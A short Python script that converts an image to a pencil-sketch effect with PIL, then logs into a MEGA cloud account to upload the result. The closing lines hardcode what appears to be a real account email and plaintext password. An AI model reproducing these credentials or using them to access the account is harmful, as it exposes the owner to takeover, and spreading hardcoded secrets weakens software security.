import shutil
from mega import Mega
import os

import numpy as np

# np.set_printoptions(threshold=sys.maxsize)
import torch
from torchvision import transforms
from PIL import Image, ImageOps, ImageFilter

def convert_image_to_sketch(input_image_path, output_image_path):
    # Load image
    img = Image.open(input_image_path).convert('RGB')

    # Convert image to grayscale
    gray_img = img.convert('L')

    # Invert the grayscale image
    inverted_img = ImageOps.invert(gray_img)

    # Blur the inverted image
    blurred_img = inverted_img.filter(ImageFilter.GaussianBlur(radius=20))

    # Create the sketch image by blending the grayscale and blurred images
    sketch_img = Image.blend(gray_img, blurred_img, alpha=0.5)

    # Save the resulting image
    sketch_img.save(output_image_path)

    print(f"Sketch saved as {output_image_path}")

inp = 'img.png'
op = 'output.png'
# Example usage
convert_image_to_sketch(inp,op)
mega = Mega()
m = mega.login("afg154006@gmail.com",'megaMac02335!')
if os.path.exists(op):
    m.upload(op)